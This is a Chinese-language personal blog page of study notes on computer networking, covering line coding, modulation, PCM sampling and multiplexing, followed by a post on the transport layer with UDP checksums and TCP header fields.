<h5 id="线路编码需要解决的问题"><a href="#线路编码需要解决的问题" class="headerlink" title="线路编码需要解决的问题"></a>线路编码需要解决的问题</h5><p><strong>基线偏移</strong></p>
<p>接收方需要观察信号一段时间,才能计算出信号的平均功率,然后根据信号的瞬时功率决定当前信号是高电位还是低电位</p>
<blockquote>
<p>假如使用高电位编码1,低电位编码0</p>
<p>然后发送方故意找茬发了一亿个1,接收方认为平均功率就是10V电压对应的功率.如果后来的1,其电位稍微低了点,成了8V,接收方就会把它解码为0</p>
</blockquote>
<p>尽量避免基线偏移就得选择正负电位出现几率相同的编码方式</p>
<p><strong>直流分量</strong></p>
<p>一个信号可能会有变化很剧烈的地方,也可能会有变化比较缓慢的地方</p>
<p>比如如果发送方连续发送一亿个1,那么信号就可能是持续1秒的高电位,几乎成为了直流电</p>
<p>直流电无法通过电容这种器件.会被过滤掉</p>
<p>尽量避免直流分量,就得选择变化剧烈的编码方式</p>
<p><strong>自同步</strong></p>
<p>就是”对表”,接收方得和发送方时钟差不多一致</p>
<p>否则可能出现下图情况</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206165153188.png" alt="image-20230206165153188"></p>
<p><strong>差错检测</strong></p>
<p><strong>抗噪声,抗干扰</strong></p>
<p><strong>实现的复杂性</strong></p>
<h4 id="线性编码方案"><a href="#线性编码方案" class="headerlink" title="线性编码方案"></a>线性编码方案</h4><table>
<thead>
<tr>
<th>性质</th>
<th>编码方案</th>
<th>图像</th>
<th>特点</th>
<th>带宽和数据速率</th>
</tr>
</thead>
<tbody><tr>
<td>单极性</td>
<td>不归零(NRZ)</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206165544099.png" alt="image-20230206165544099" style="zoom:25%;" /></td>
<td>1高0低</td>
<td>$B&#x3D;\frac{N}{2}$</td>
</tr>
<tr>
<td>极性</td>
<td>不归零(NRZ)</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206165603612.png" alt="image-20230206165603612" style="zoom:25%;" /></td>
<td>NRZ-L:0正1负<br />NRZ-I:遇1则拐</td>
<td>$B&#x3D;\frac{N}{2}$</td>
</tr>
<tr>
<td>极性</td>
<td>归零码(Polar RZ)</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206165727587.png" alt="image-20230206165727587" style="zoom:25%;" /></td>
<td>0先负后0<br />1先正后0</td>
<td>$B&#x3D;\frac{N}{2}$</td>
</tr>
<tr>
<td>极性</td>
<td>双向码<br />曼彻斯特编码<br />差分曼彻斯特编码</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206165747839.png" alt="image-20230206165747839" style="zoom:25%;" /></td>
<td>曼彻斯特:0先负后正,1先正后负<br />差分曼彻斯特:1先保持,0立刻转</td>
<td>$B&#x3D;\frac{N}{2}$</td>
</tr>
<tr>
<td>双极性</td>
<td>交替传号反码(AMI)<br />伪三元编码(Pseudoternary)</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206165817455.png" alt="image-20230206165817455" style="zoom:25%;" /></td>
<td>AMI:1正负交替,0就是0<br />Pseudotemary:0正负交替,1为0</td>
<td>$B&#x3D;N$</td>
</tr>
<tr>
<td>多电平mBnL<br />m个数据元素编码成n个信号元素<br />也就是n个码元承载m个bit</td>
<td>2B1Q(L&#x3D;4&#x3D;Q)</td>
<td>2B1Q:<br /><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206165942113.png" alt="2B1Q" style="zoom:28%;" /><br />8B6T:<br /><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206172529742.png" alt="8B6T" style="zoom:25%;" /></td>
<td>多个电位,可以用连续的几个电位编码连续的几个bit<br />比如2B1Q意思是,每两个bit为一个组,有4种电位,一组使用一个信号单元(码元),也就是$r&#x3D;2$<br />比如8B6T意思是,每8个bit为一组,有3种电位,一个组使用连续的6个信号单元(码元),也就是$r&#x3D;8&#x2F;6&#x3D;4&#x2F;3$</td>
<td>2B1Q:$B&#x3D;\frac{N}{2}$<br />8B6T:$B&#x3D;\frac{3N}{4}$</td>
</tr>
<tr>
<td>多电平并发</td>
<td>4D-PAM5<br />四线路并发的8B1Q</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206173348090.png" alt="image-20230206173348090" style="zoom: 33%;" /></td>
<td>00对应-2电位<br />01对应1电位<br />11对应2电位<br />10对应-1电位<br />从四根铜线上并发传送<br />如果只有一根线,则相当于8B1Q<br /></td>
<td>$B&#x3D;\frac{N}{8}$</td>
</tr>
<tr>
<td>多线路</td>
<td>MLT-3<br />三电平多线路传输</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206173729253.png" alt="image-20230206173729253" style="zoom: 33%;" /></td>
<td>跳变方式多于两种,之前的极性非极性编码都只有两种跳变方式.而MLT-3中的跳变多余两种<br /><br />跳变规则:<br />如果下一位是0，没有跳变<br />如果下一位是1且当前电平是0，下一个电平是最后一个非零电平的相反值<br />如果下一位是1且当前电平不是0，下一个电平是0</td>
<td>$B&#x3D;\frac{N}{3}$</td>
</tr>
</tbody></table>
<h4 id="块编码"><a href="#块编码" class="headerlink" title="块编码"></a>块编码</h4><p>块编码,mB&#x2F;nB编码,将m个bit加上额外的位组成nbit(n&gt;m)</p>
<p>其目的是加上冗余信息,确保同步,并获得差错控制能力</p>
<p>或者说有一定的加密能力</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206174741944.png" alt="image-20230206174741944"></p>
<p>计算机发出的和接收到的仍然是裸数据,mB&#x2F;nB编码和解码器屏蔽了这个添加&#x2F;去掉冗余的过程</p>
<p>具体如何编码呢?以4B&#x2F;5B为例</p>
<img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206174931435.png" alt="麻了,没看出编码算法来" style="zoom:25%;" />

<p>冗余组:使用了5位,实际上只有4位满编,也就是说,有$2^4$个编码是有实际意义的</p>
<p>剩下的$2^5-2^4&#x3D;16$个编码就是冗余组,可以另外定义意义</p>
<h4 id="扰码"><a href="#扰码" class="headerlink" title="扰码"></a>扰码</h4><p>扰码用于解决什么问题?</p>
<p>先说之前的编码方式的缺点</p>
<blockquote>
<p>双相码适用于LAN中间站的专用链路，不适用于长距离通信；</p>
<p>块编码和NRZ编码的组合有DC分量，也不适合于长距离通信；</p>
<p>双极性AMI带宽窄且没有DC分量，但连续0的长序列会失去同步。B8ZS和HDB3</p>
</blockquote>
<p>扰码就是为了解决这些问题</p>
<p>咋解决呢?避免出现连续多个相同的电位</p>
<table>
<thead>
<tr>
<th>扰码编码方式</th>
<th>图像</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>B8ZS</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206185948688.png" alt="image-20230206185948688" style="zoom:25%;" /></td>
<td>连续的八个0会被替换为000VB0VB<br /></td>
</tr>
<tr>
<td>HDB3</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206190003629.png" alt="image-20230206190003629" style="zoom:25%;" /></td>
<td>4个连续0电平被置换成000V或B00V；<br />两个不同的置换是由于为了维持每次置换后非零脉冲为偶数；<br />如果最后一次置换后的非零脉冲数是奇数，置换为000V，使得非零脉冲总数为偶数；<br />如果最后一次置换后的非零脉冲数是偶数，置换为B00V，使得非零脉冲总数为偶数。</td>
</tr>
</tbody></table>
<h3 id="模拟信号调成数字信号"><a href="#模拟信号调成数字信号" class="headerlink" title="模拟信号调成数字信号"></a>模拟信号调成数字信号</h3><p>两种方式:PCM或者Delta</p>
<h4 id="PCM"><a href="#PCM" class="headerlink" title="PCM"></a>PCM</h4><p>模拟信号调制成数字信号</p>
<p>没看错,就是模拟信号调制成数字信号,不是解调</p>
<p>这就奇怪了,远距离传送信号的时候都是在发送端先把数字信号调制成模拟信号,然后接收端模拟信号再解调成数字信号.但是PCM里是故意把模拟信号调制成数字信号的</p>
<p>实际应用?比如要研究星球脉冲的规律.由于这个星球每时每刻都在发射信号,在时域上是连续无限的.计算机首先需要存储了数据然后才能分析.</p>
<p>怎么存储就是问题了,如果保留半小时内的观测数据,也是有无穷多的时间点的.</p>
<p>可以选择每1分钟记录一次,或者每一秒,每一毫秒记录一次.</p>
<p>这样就把一个连续的模拟信号采样成离散的数字信号了</p>
<p>这个过程如图所示</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206191918320.png" alt="image-20230206191918320"></p>
<h5 id="采样"><a href="#采样" class="headerlink" title="采样"></a>采样</h5><p>采样率:单位时间内采取的离散信号的个数,单位,Hz</p>
<p>根据奈奎斯特定律,采样率必须是信号最高频率的两倍</p>
<p>为啥呢?下图意思意思</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206192614340.png" alt="image-20230206192614340"></p>
<h5 id="量化"><a href="#量化" class="headerlink" title="量化"></a>量化</h5><p>采样之后,离散的信号振幅也是一个不规整的值,现在规定几个固定的”合法振幅”,让这些离散信号振幅舍入到最近的”合法振幅”</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206194038088.png" alt="image-20230206194038088"></p>
<p>怎么选取”合法振幅”呢?</p>
<p>假设要分成L&#x3D;10个区间($-5\Delta,-4\Delta,-3\Delta,….,0,\Delta,2\Delta,5\Delta$),</p>
<p>设离散信号振幅值的最大和最小值分别为$V_{max},V_{min}$</p>
<p>那么一个delta的高度就是<br>$$<br>\Delta &#x3D;\frac{V_{max}-V_{min}}{L}<br>$$<br>然后原来的各点就近似为各自最近的”合法振幅”</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206194500351.png" alt="image-20230206194500351"></p>
<h5 id="量化误差"><a href="#量化误差" class="headerlink" title="量化误差"></a>量化误差</h5><p>L越大,每个Delta越小,分的阶层越多,近似就越少,误差就越小<br>$$<br>SNR_{dB}&#x3D;6.02n_b+1.76dB<br>$$</p>
<p>这里$n_b$是每个样本需要多少位表示</p>
<p>在[-4D,4D]中有8个”合法振幅”等级,那么要编码一个合法振幅就得用$\log_28&#x3D;3$个bit</p>
<p>因此在这里$n_b&#x3D;3$</p>
<p>分层越多,也就是$n_b$越大,信噪比越大,也就是噪声的影响越小,也就是越准确.</p>
<h5 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h5><p>量化等级L,也就是分层个数越多,表示一个采样数据所需要的bit位数就越多<br>$$<br>n_b&#x3D;\log_2 L<br>$$</p>
<p>因此可以得到</p>
<p>$$<br>比特率N&#x3D;采样速率f_s \times 每个样本的位数n_b<br>$$</p>
<blockquote>
<p>人语音的频率范围是$[0,4k]Hz$,假设要数字化人的语音,每个样本有8位,比特率是多少?</p>
<p>根据奈奎斯特定律,采样速率得是最高频率的两倍,也就是说$f_s&#x3D;4kHz\times2&#x3D;8kHz$</p>
<p>那么比特率就是:<br>$$<br>N&#x3D;f_s\times n_b&#x3D;8k\times 8&#x3D;64kbps<br>$$<br>电子包浆音乐应该就是量化等级太低导致的</p>
</blockquote>
<h5 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h5><p>$$<br>B_{min}&#x3D;cN\frac{1}{r}<br>$$</p>
<p>c,情形因子,取1&#x2F;2</p>
<p>r,码元和携带比特位的比例,在NRZ或者双极性编码信号中r&#x3D;1</p>
<p>N,传输速率,比特率$N&#x3D;f_s\times n_b$</p>
<p>$f_s&#x3D;2f_{max}$采样率,信号最大频率的二倍</p>
<p>$n_b&#x3D;\log_2 L$,每个样本的位数</p>
<p>带入得到<br>$$<br>B_{min}&#x3D;\frac{1}{2}\times 2f_{max}\times n_b&#x3D;f_{max}\times n_b<br>$$</p>
<h4 id="传输方式-1"><a href="#传输方式-1" class="headerlink" title="传输方式"></a>传输方式</h4><p>并行</p>
<p>串行,包括同步,异步,等时</p>
<h5 id="并行"><a href="#并行" class="headerlink" title="并行"></a>并行</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206205143862.png" alt="image-20230206205143862"></p>
<p>同时传送nbit,就需要n根线</p>
<h5 id="串行"><a href="#串行" class="headerlink" title="串行"></a>串行</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206205224898.png" alt="image-20230206205224898"></p>
<h6 id="异步传输"><a href="#异步传输" class="headerlink" title="异步传输"></a>异步传输</h6><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206205415315.png" alt="image-20230206205415315"></p>
<p>数据可以字节为单位,在任何时候抵达,双方都不需要时钟</p>
<p>因此需要在字节两头加上起始和结束的标志位,用以同步</p>
<h6 id="同步传输"><a href="#同步传输" class="headerlink" title="同步传输"></a>同步传输</h6><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206205500359.png" alt="image-20230206205500359"></p>
<p>数据以帧为单位,双方需要有公共时钟,帧上没有起始结束标志,双方需要对拍</p>
<h6 id="等时传输"><a href="#等时传输" class="headerlink" title="等时传输"></a>等时传输</h6><p>数据以规定速率到达</p>
<p>比如实时音视频中,帧间的延迟应该相同且小,避免造成卡顿</p>
<h3 id="模拟传输"><a href="#模拟传输" class="headerlink" title="模拟传输"></a>模拟传输</h3><h4 id="概念区分"><a href="#概念区分" class="headerlink" title="概念区分"></a>概念区分</h4><p>低通,带通,基带,宽带的关系:</p>
<p>基带通信使用低通信道</p>
<p>宽带通信使用带通信道</p>
<p><strong>调频FM和频移键位FSK</strong>的关系?一个东西</p>
<h4 id="数转模方法"><a href="#数转模方法" class="headerlink" title="数转模方法"></a>数转模方法</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206211028412.png" alt="image-20230206211028412"></p>
<p>载波信号:发送设备产生高频信号作为基波承载信息</p>
<p>接收设备的收听频率和载波信号相同</p>
<p>数字信息通过改变载波信号的特性来将自身信息加到载波上去.称为调制或者移动键控</p>
<table>
<thead>
<tr>
<th>调制方法</th>
<th>调制图像</th>
<th>实现原理</th>
<th>带宽</th>
</tr>
</thead>
<tbody><tr>
<td>二进制幅移键控BASK</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206211425111.png" alt="image-20230206211425111" style="zoom:25%;" /></td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206211328384.png" alt="image-20230206211328384" style="zoom:25%;" /></td>
<td>$B&#x3D;(1+d)\times S$</td>
</tr>
<tr>
<td>二进制频移键控BFSK</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206211626226.png" alt="image-20230206211626226" style="zoom:25%;" /></td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206211736958.png" alt="image-20230206211736958" style="zoom:25%;" /></td>
<td>$B&#x3D;(1+d)\times S+2\Delta f$<br />多电平时:<br />$B &#x3D; (1+d ) ×S + ( L -1 )2Δf $</td>
</tr>
<tr>
<td>二进制相移键控BPSK</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206211835623.png" alt="image-20230206211835623" style="zoom:25%;" /></td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206211840285.png" alt="image-20230206211840285" style="zoom:25%;" /></td>
<td>$B&#x3D;(1+d)\times S$</td>
</tr>
<tr>
<td>正交相移键控QPSK</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206212108468.png" alt="image-20230206212108468" style="zoom:25%;" /></td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206212156094.png" alt="image-20230206212156094" style="zoom:25%;" /></td>
<td></td>
</tr>
</tbody></table>
<p>这个正交相移键控是啥意思呢?</p>
<p>使用同一个信号,里面有两个大的正交分量载波信号</p>
<p>两个分量并行传送</p>
<p>假设要传输信号00’10’01’11</p>
<p>两个一组取前一个扔给一个载波分量</p>
<p>取后一个扔给另一个垂直的载波分量</p>
<p>不用两根导线就可以同时传输两路信息,这就是QPSK的目的</p>
<p>实际上就是两个BPSK的正交</p>
<h4 id="模转模方法"><a href="#模转模方法" class="headerlink" title="模转模方法"></a>模转模方法</h4><table>
<thead>
<tr>
<th>模转模方法</th>
<th>图像及原理</th>
<th>带宽<br />B为原始模拟信号带宽</th>
</tr>
</thead>
<tbody><tr>
<td>调幅AM</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206213909043.png" alt="image-20230206213909043" style="zoom:25%;" /></td>
<td>$B_{AM} &#x3D; 2B$</td>
</tr>
<tr>
<td>调频FM</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230206213914303.png" alt="image-20230206213914303" style="zoom:25%;" /></td>
<td>$ B_{FM} &#x3D; 2(1 + β)B$<br />其中$\beta$为调制因子,通常设置为4</td>
</tr>
<tr>
<td>调相PM</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/phase.jpg" alt="phase" style="zoom: 67%;" /></td>
<td>$B_{PM} &#x3D; 2(1 + β)B$</td>
</tr>
</tbody></table>
<h3 id="带宽利用"><a href="#带宽利用" class="headerlink" title="带宽利用"></a>带宽利用</h3><p>这部分没看懂</p>
<h4 id="复用"><a href="#复用" class="headerlink" title="复用"></a>复用</h4><table>
<thead>
<tr>
<th>复用技术</th>
<th>原理</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>频分多路复用FDM</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212145609855.png" alt="image-20230212145609855" style="zoom:25%;" /></td>
<td>合并模拟信号</td>
</tr>
<tr>
<td>波分多路复用WDM</td>
<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212145843612.png" alt="image-20230212145843612" style="zoom:25%;" /></td>
<td>合并光信号</td>
</tr>
<tr>
<td>时分多路复用TDM</td>
<td>同步时分复用和统计时分复用的区别<br /><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212150226755.png" style="zoom:25%;" /></td>
<td>同步时分复用中,每一帧的最开始有一帧指示位用于同步,然后就是E,D,C,B,A每一路的数据,即使这一路上没有数据,也得用空时隙填充<br />统计时分复用中是哪一路有数据才传输哪一路,在数据之前标注这是哪一路的数据</td>
</tr>
</tbody></table>
<p>复用:允许使用一条数据链路传输多个信号的技术</p>
<h4 id="扩频"><a href="#扩频" class="headerlink" title="扩频"></a>扩频</h4><p>麻了,啥玩意儿</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/02/08/%E4%BC%A0%E8%BE%93%E5%B1%82/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/08/%E4%BC%A0%E8%BE%93%E5%B1%82/" class="post-title-link" itemprop="url">计算机网络-传输层</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-08 18:08:00" itemprop="dateCreated datePublished" datetime="2023-02-08T18:08:00+08:00">2023-02-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-05-05 15:57:07" itemprop="dateModified" datetime="2024-05-05T15:57:07+08:00">2024-05-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="计算机网络-传输层"><a href="#计算机网络-传输层" class="headerlink" title="计算机网络-传输层"></a>计算机网络-传输层</h1><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>网络层提供点到点服务,也就是主机到主机的服务</p>
<p>传输层提供端到端服务,也就是进程到进程的服务</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221128103802707.png" alt="image-20221128103802707"></p>
<h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h4><table>
<thead>
<tr>
<th>层</th>
<th>寻址方式</th>
<th>寻址范围</th>
</tr>
</thead>
<tbody><tr>
<td>链路层</td>
<td>MAC地址</td>
<td></td>
</tr>
<tr>
<td>网络层</td>
<td>ip地址</td>
<td>ipv4地址32位</td>
</tr>
<tr>
<td>传输层</td>
<td>端口号</td>
<td>端口号16位</td>
</tr>
</tbody></table>
<p><strong>服务端</strong>端口号规定</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221128104113012.png" alt="image-20221128104113012"></p>
<p>客户端都是临时端口,不用管到底用的哪个端口</p>
<h4 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h4><p>socket&#x3D;IP地址+端口号</p>
<p>一个套接字唯一标识了一个进程</p>
<p>一个TCP连接两头是两个套接字,即一个TCP连接被一对套接字决定</p>
<h4 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h4><p>可靠传输:不错,不丢,不乱</p>
<p>每一层的校验都只校验本层数据</p>
<table>
<thead>
<tr>
<th>层</th>
<th>差错控制的目的</th>
<th>是否可靠</th>
</tr>
</thead>
<tbody><tr>
<td>数据链路层</td>
<td>通过CRC校验,保证一个帧中没有比特差错,但不能保证丢不丢帧</td>
<td>否,只能保证不错</td>
</tr>
<tr>
<td>网络层IP协议</td>
<td>只针对网络层包的头部进行CRC校验</td>
<td>否</td>
</tr>
<tr>
<td>传输层TCP协议</td>
<td>保证做到无传输差错</td>
<td>是</td>
</tr>
</tbody></table>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><table>
<thead>
<tr>
<th>传输层协议</th>
<th>应用场景</th>
</tr>
</thead>
<tbody><tr>
<td>TCP</td>
<td>客户端和服务端多次交互入访问页面HTTP<br />传输文件FTP<br />电子邮件POP3,SMTP</td>
</tr>
<tr>
<td>UDP</td>
<td>实时聊天通信,DNS,多播,广播<br />对等网络技术P2P<br />部分路由协议RIP<br />网络时间管理NTP<br />简单网络管理SNTP</td>
</tr>
</tbody></table>
<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><h4 id="UDP首部"><a href="#UDP首部" class="headerlink" title="UDP首部"></a>UDP首部</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221128105608481.png" alt="UDP首部"></p>
<p>源端口,目的端口各16位,总长度16位,校验和16位</p>
<h4 id="校验和"><a href="#校验和" class="headerlink" title="校验和"></a>校验和</h4><p>UDP的校验和&#x3D;UDP伪首部+UDP首部+数据</p>
<p>这个伪首部指，源地址、目的地址、协议类型（0x11）,一个字节的全0,一个字节的<strong>UDP数据长度</strong>，对齐填充2字节的0，整个伪首部共12个字节。</p>
<blockquote>
<p><strong>UDP伪首部是为了计算校验和而临时存在的,在计算之前由主机加上,计算之后立刻扔掉,不会参与传输</strong></p>
<p>UDP伪首部和IP首部无关,<strong>不能理解为</strong>借用的IP首部</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/v2-86bb22904619c1bd318996b26b7825c2_720w.webp" alt="UDP伪首部不是IP首部"></p>
<p>伪首部中的UDP长度就是UDP首部+UDP数据的长度,不需要考虑对齐填充,是多少就是多少</p>
</blockquote>
<p>伪首部+UDP首部+数据一起计算校验和。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221128110006207.png" alt="image-20221128110006207"></p>
<p>具体计算方法:</p>
<p><strong>16位一组相加,最高位进位回卷,和Sum取反得到CheckSum</strong></p>
<p>在计算校验和时,此时UDP首部的校验和字段先置零,伪首部中的UDP长度就是实际的UDP长度,15,不用考虑对齐填充</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221128110218290.png" alt="image-20221128110218290"></p>
<h4 id="UDPの特点"><a href="#UDPの特点" class="headerlink" title="UDPの特点"></a>UDPの特点</h4><p>1.报文在发送方这里不会拆分,发送方一次交付一个完整报文.</p>
<blockquote>
<p>注意强调了发送方,因为网络层才不会管你拆不拆,大于MTU的报必须拆</p>
<p>比如如果发送方不管三七二十一发了一个巨大的上万字节的UDP报文</p>
<p>如果数据链路层使用以太网,那么每个以太网帧最大是1500字节,也就是说网络层的MTU&#x3D;1500(Maximum Transmission Unit).</p>
<p>显然一个上万字节的UDP数据报无法直接发送,因此路由器会进行报文分割,把该UDP数据报拆分成若干不大于1500字节的包,分开发送</p>
<p>最终在接收方还是需要组装的</p>
</blockquote>
<p>2.无流量控制,无差错控制,无拥塞控制</p>
<blockquote>
<p>差错控制要求发现错误时要求重传,但是UDP数据报的校验和如果发现错误,直接被路由器或者主机丢弃,不会要求重传</p>
</blockquote>
<h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>分段传输:虚电路建立之后,看上去TCP协议直接发送和接收字节流,就像访问硬盘一样,但是下层实际上还是数据报实现的</p>
<p>一个图是需要切成好多段,扔给网络层以报文形式交付</p>
<h4 id="TCP协议的熟知端口号"><a href="#TCP协议的熟知端口号" class="headerlink" title="TCP协议的熟知端口号"></a>TCP协议的熟知端口号</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230203162222069.png" alt="image-20230203162222069"></p>
<p>特别注意</p>
<p>20-FTP.Data</p>
<p>21-FTP.Control</p>
<p>53-DNS</p>
<h4 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h4><p>啥玩意叫字节流?</p>
<p>啥玩意叫流?Stream,在计算机里就是顺序读取或者写入的字节序列.</p>
<p>包括从硬盘读取的文件,从键盘输入的字符序列,从网络获取的字符序列.都叫流</p>
<p>叫做字节流,是因为还有一个字符流</p>
<p>两者的区别是,字节流使用8位一个字节为信息单元,一个字节传输一个信息,比如一个字母</p>
<p>而字符流使用16位两个字节作为信息单元,使用unicode编码传输信息</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221128111751747.png" alt="image-20221128111751747"></p>
<p>“流”是<strong>针对应用层上的应用程序而言</strong>的,在应用程序看来,他调用read函数从硬盘读取字节流和调用recv函数从套接字获取字节流没有区别.</p>
<p>反正就是得用<code>while(!read.eof())&#123;read(buf,n,file);...&#125;</code>这样不停地从缓冲区取出字节,因为一个文件的传输,是像水流一样,源源不断地抵达缓冲区的,不可以一下子全部获取</p>
<p>传输层只管给应用程序的缓冲区写入数据,不管应用程序拿着数据干了啥</p>
<p>应用程序只管从缓冲区读取数据,不管传输层从哪里搞来的数据</p>
<p>因此,传输层单蹦个地顺序传送比特位,还是单蹦个顺序传送字节,抑或是分段每次传送成千个字节即分段,应用程序不关心,全靠传输层自由发挥了</p>
<p>显然传输层应该选择分段发送,这样效率高</p>
<blockquote>
<p>为什么效率高?</p>
<p>对于网络来说头部长度固定,数据部分越长有效信息比例越高,需要发送的数据报越少,网络负载也就轻</p>
<p>对于主机来说,每个字节就发送一次,需要频繁地系统调用(显然访问网络这种外设需要系统调用),开销太大</p>
</blockquote>
<h4 id="首部格式"><a href="#首部格式" class="headerlink" title="首部格式"></a>首部格式</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221128111530489.png" alt="image-20221128111530489"></p>
<h5 id="Source-Destination-port-address"><a href="#Source-Destination-port-address" class="headerlink" title="Source&#x2F;Destination port address"></a>Source&#x2F;Destination port address</h5><p>源&#x2F;目的端口地址</p>
<h5 id="sequence-number"><a href="#sequence-number" class="headerlink" title="sequence number"></a>sequence number</h5><p>字节序列号,一个TCP包可以发送若干数据字节,每一个数据字节都编一个字节序列号,</p>
<p>在首部中sequence number表明本TCP报文中<strong>第一个数据字节的编号</strong></p>
<p>本字段用于分段系统</p>
<h5 id="acknowledgment-number"><a href="#acknowledgment-number" class="headerlink" title="acknowledgment number"></a>acknowledgment number</h5><p>确认号字段,<strong>期望收到的,对方下一个报文段数据的,第一个字节的序号</strong></p>
<p>本字段用于分段系统</p>
<h5 id="HLEN"><a href="#HLEN" class="headerlink" title="HLEN"></a>HLEN</h5><p>header length首部长度,<strong>其单位是4字节</strong></p>
<p>比如HLEN&#x3D;5&#x3D;0101b,表示首部长度为5*4&#x3D;20字节</p>
<h5 id="Reserved"><a href="#Reserved" class="headerlink" title="Reserved"></a>Reserved</h5><p>保留字段,6位,目前全置零</p>
<h5 id="控制字段"><a href="#控制字段" class="headerlink" title="控制字段"></a>控制字段</h5><p>6位</p>
<p>用于TCP连接的流量控制,连接建立终止,连接失败和数据传送方式</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221128113731360.png" alt="image-20221128113731360"></p>
<p>当URG&#x3D;1时,紧急指针Urgent pointer才有效</p>
<blockquote>
<p>如何体现紧急?</p>
<p>正常情况下一个TCP报文段会拆分重组</p>
<p>整个重组利索之后才会交付给应用程序</p>
<p>而紧急数据无需等待重组,直接交给应用程序</p>
</blockquote>
